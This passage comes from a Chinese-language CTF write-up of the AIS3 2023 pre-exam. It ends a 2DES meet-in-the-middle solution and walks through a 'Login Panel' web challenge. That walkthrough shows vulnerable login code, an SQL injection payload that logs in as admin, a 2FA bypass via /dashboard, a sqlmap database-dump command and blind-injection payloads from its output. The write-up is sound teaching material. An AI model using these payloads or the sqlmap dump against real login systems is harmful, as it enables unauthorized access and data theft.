348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1512.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msup" transform="translate(2512.6,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(4080.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(5136.2,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>，變的看起來可行了。</p><p>不過還有一個問題：存 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 種可能的 middle 會耗掉太多空間然後噴錯（有人還把這個做成<a href="/ais3-pre-exam-2023-write-up/2des-meme.png">梗圖</a>）。</p><h6 id="DES-Key-Transformation"><a href="#DES-Key-Transformation" class="headerlink" title="DES Key Transformation"></a>DES Key Transformation</h6><p>DES 在拿到 64 bits 的 key 的時候，會把一些東西丟掉變成 56 bits 的 key，所以實際上需要列舉的 <code>key1</code> <code>key2</code> 其實可以更少。</p><p>DES 的 64 bits 的 key 中，第 8, 16, 24, 32, 40, 48, 56, 64 個 bit 是會被丟掉的，不會影響到加解密，所以需列舉的 <code>key1</code> <code>key2</code> 其實各只有 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.904ex" role="img" focusable="false" viewBox="0 -841.7 1290.1 841.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 種。</p><p>提供我的 Javascript 及 Python 解，都可在 200 秒內於我的電腦上跑出結果，Javascript 比較快。</p><p><a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/crypto/2des/exp/exp.js">Javascript 解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/crypto/2des/exp/exp.py">Python 解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>這題也有人不透過 DES Key Transformation 的特性來解：既然存 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 個 middle 會出錯，那就只存隨機挑的一部分就好了，存到電腦可負荷的量就好，這樣也有高機率解的出來。</p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Login-Panel"><a href="#Login-Panel" class="headerlink" title="Login Panel"></a>Login Panel</h4><p><a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/web/login-panel">題目 source code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li>解題人數<ul><li>MyFirstCTF: 24 / 111 (score &gt;= 100)</li><li>Pre-exam: 139 / 256 (score &gt;= 100)</li></ul></li></ul><p>這題是 web 的 welcome 題，是來送大家分數的。進來會看到 CTF 很常出現的 login panel。</p><iframe frameBorder="0" style="overflow: visible; width: 100%; height: 30rem; " scrolling="no" srcdoc="<!DOCTYPE html> <html lang=&quot;en&quot;> <head> <meta charset=&quot;UTF-8&quot;> <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;> <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;><title>Login</title> <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;> <script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script> <script type=&quot;text/javascript&quot;> function onSubmit(token) { login.submit(); } (function(c,l,a,r,i,t,y){ c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)}; t=l.createElement(r);t.async=1;t.src=&quot;https://www.clarity.ms/tag/&quot;+i; y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y); })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;); </script> </head> <body> <div class=&quot;container border rounded mt-5&quot; style=&quot;width: 25rem; max-width: 100%;&quot;> <form class=&quot;p-4&quot; id=&quot;login&quot;> <h2>Login</h2> <div class=&quot;form-text&quot;>You can login as guest/guest.</div> <div class=&quot;form-outline mt-3&quot;> <label for=&quot;username&quot; class=&quot;form-label&quot;>Username:</label> <input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; class=&quot;form-control&quot;> </div> <div class=&quot;form-outline mt-3&quot;> <label for=&quot;password&quot; class=&quot;form-label&quot;>Password:</label> <input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot;> </div> <input type=&quot;submit&quot; value=&quot;Submit&quot; class=&quot;btn btn-primary mt-3 g-recaptcha&quot; data-sitekey=&quot;6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI&quot; data-callback=&quot;onSubmit&quot;> </form> </div> </body> </html>"></iframe><p>這題比賽時有提供 <a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/web/login-panel">source code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 所以大家可以不用通靈題目有什麼洞，直接來看看<a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/login-panel/web/app.js#L56-L72">登入部分的 code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>看到下方的第 3 行，使用者提供的 <code>username</code> 跟 <code>password</code> 直接被放進 SQL 的語句內，所以有明顯的 SQL injection 漏洞。</p><p>需要注意的一點是第 6 行還會檢查使用者提供的 <code>username</code> 要跟 SQL query 出來的 <code>row.username</code> 相等才能成功登入。知道這些就可以來想辦法登入了。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">'/login'</span>, recaptcha.<span class="property">middleware</span>.<span class="property">verify</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">const</span> { username, password } = req.<span class="property">body</span></span><br><span class="line">    db.<span class="title function_">get</span>(<span class="string">`SELECT * FROM Users WHERE username = '<span class="subst">${username}</span>' AND password = '<span class="subst">${password}</span>'`</span>, <span class="keyword">async</span> (err, row) =&gt; {</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`https://www.youtube.com/watch?v=dQw4w9WgXcQ`</span>)</span><br><span class="line">        <span class="keyword">if</span> (!row) <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/login?msg=invalid_credentials`</span>)</span><br><span class="line">        <span class="keyword">if</span> (row.<span class="property">username</span> !== username) {</span><br><span class="line">            <span class="comment">// special case</span></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`https://www.youtube.com/watch?v=E6jbBLrxY1U`</span>)</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">recaptcha</span>.<span class="property">error</span>) {</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">recaptcha</span>.<span class="property">error</span>)</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/login?msg=invalid_captcha`</span>)</span><br><span class="line">        }</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">username</span> = username</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">'/2fa'</span>)</span><br><span class="line">    })</span><br><span class="line">})</span><br></pre></td></tr></table></figure></div><p>我們只需要將 <code>username</code> 設成 <code>admin</code>，<code>password</code> 設成 <code>' or ''='</code> SQL 語句就會變成下面這樣。所有在 <code>Users</code> 裡面的 row 都符合這個條件，加上使用的是 <code>db.get</code> 所以會回傳符合條件的第一個欄位，也就是 <code>admin</code> 的那個 row。</p><p>這個 payload 也可以通過第 6 行的檢查，所以就能成功登進去 <code>admin</code> 的帳戶了。有人一直繞不過第 6 行的檢查還被做成<a href="/ais3-pre-exam-2023-write-up/login-panel-meme.png">梗圖</a>。</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">'admin'</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">''</span> <span class="keyword">or</span> <span class="string">''</span><span class="operator">=</span><span class="string">''</span></span><br></pre></td></tr></table></figure></div><p>進去後會看到 2FA 頁面，我們先來檢查他的 2FA 功能有沒有洞，因為 source 裡面有說 flag 在 <code>/dashboard</code> 裡面，直接來看 <a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/login-panel/web/app.js#L98-L106">dashboard 的 code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><iframe frameBorder="0" style="overflow: visible; width: 100%; height: 37rem; " scrolling="no" srcdoc="<!DOCTYPE html> <html lang=&quot;en&quot;>  <head>     <meta charset=&quot;UTF-8&quot;>     <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;>     <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;>     <meta name=&quot;robots&quot; content=&quot;noindex,nofollow&quot;>     <title>2FA</title>     <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;>     <script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script>     <script type=&quot;text/javascript&quot;>         (function (c, l, a, r, i, t, y) {             c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };             t = l.createElement(r); t.async = 1; t.src = &quot;https://www.clarity.ms/tag/&quot; + i;             y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);         })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;);     </script> </head>  <body>     <div class=&quot;container border rounded mt-5&quot; style=&quot;width: 25rem; max-width: 100%&quot;>         <form class=&quot;p-4&quot; id=&quot;login&quot;>             <h2 class=&quot;mb-3&quot;>2FA</h2>             <div class=&quot;alert alert-info&quot; role=&quot;alert&quot;>2FA code was sent to your email. Please enter it below.</div>             <div class=&quot;alert alert-primary&quot; role=&quot;alert&quot;>If you are a guest, your 2FA code will always be <code>99999999999999</code>.</div>              <div class=&quot;form-outline mt-3&quot;>                 <label for=&quot;code&quot; class=&quot;form-label&quot;>2FA Code</label>                 <input type=&quot;number&quot; id=&quot;code&quot; name=&quot;code&quot; class=&quot;form-control&quot; value=&quot;99999999999999&quot;>             </div>                                       <input type=&quot;submit&quot; value=&quot;Submit&quot; class=&quot;btn btn-primary mt-3 g-recaptcha&quot;>         </form>     </div> </body>  </html>"></iframe><p>看到下方 <code>/dashboard</code> 的部分，他根本沒去驗 2FA 認證有沒有通過，只有看 <code>req.session.username</code>，而 <code>req.session.username</code> 在成功登入的時候就已被設成 <code>admin</code> 了，所以登入到 2FA 頁面後直接訪問 <code>/dashboard</code> 就可以看到 flag 了。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">'/dashboard'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">username</span>) {</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">'dashboard'</span>, {</span><br><span class="line">            <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">username</span>,</span><br><span class="line">            <span class="attr">flag</span>: <span class="variable constant_">FLAG</span></span><br><span class="line">        })</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">'/'</span>)</span><br><span class="line">})</span><br></pre></td></tr></table></figure></div><iframe frameBorder="0" style="overflow: visible; width: 100%; height: 30rem; " scrolling="no" srcdoc="<!DOCTYPE html> <html lang=&quot;en&quot;>  <head>     <meta charset=&quot;UTF-8&quot;>     <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;>     <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;>     <meta name=&quot;robots&quot; content=&quot;noindex,nofollow&quot;>     <title>Dashboard</title>     <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;>     <script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script>     <script type=&quot;text/javascript&quot;>         (function (c, l, a, r, i, t, y) {             c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };             t = l.createElement(r); t.async = 1; t.src = &quot;https://www.clarity.ms/tag/&quot; + i;             y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);         })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;);     </script> </head>  <body>     <div class=&quot;container&quot;>         <h2 class=&quot;mt-5&quot;>Dashboard</h2>         <div class=&quot;alert alert-info mt-4 alert-dismissible&quot; role=&quot;alert&quot;>Welcome back admin!</div>                     <div class=&quot;alert alert-primary mt-4&quot; role=&quot;alert&quot;>Here is your flag: <code>AIS3{' UNION SELECT 1, 1, 1, 1 WHERE ({condition})--}</code></div>                  <a class=&quot;btn btn-primary mt-3&quot;>Logout</a>     </div>  </body>  </html>"></iframe><p>然後這題雖然有裝 reCAPTCHA 但其實沒有裝好，所以可以直接用 sqlmap 把資料庫直接 dump 出來，只是有些地方要按對才挖的出來。</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap http://url/login --data <span class="string">"username=admin*&amp;password=p"</span> --level 5 --risk 3 --dump</span><br></pre></td></tr></table></figure></div><p>執行上面這個的時候，會被問到下面這類問題，這邊要按 <code>n</code>，因為有些時候會把 sqlmap 導到 Youtube 造成 sqlmap 會有錯誤的判斷。</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">got a 302 redirect to <span class="string">'http://xxx/'</span>. Do you want to follow? [Y/n]</span><br></pre></td></tr></table></figure></div><p>把資料庫 dump 出來後就直接拿去正常登入就好了。</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Parameter: <span class="comment">#1* ((custom) POST)</span></span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - comment)</span><br><span class="line">    Payload: username=admin%<span class="string">' OR NOT 1853=1853-- aGKT&amp;password=p</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: SQLite &gt; 2.0 OR time-based blind (heavy query)</span></span><br><span class="line"><span class="string">    Payload: username=admin%'</span> OR 7991=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND <span class="string">'wNiy%'</span>=<span class="string">'wNiy&amp;password=p</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">Database: &lt;current&gt;</span></span><br><span class="line"><span class="string">Table: Users</span></span><br><span class="line"><span 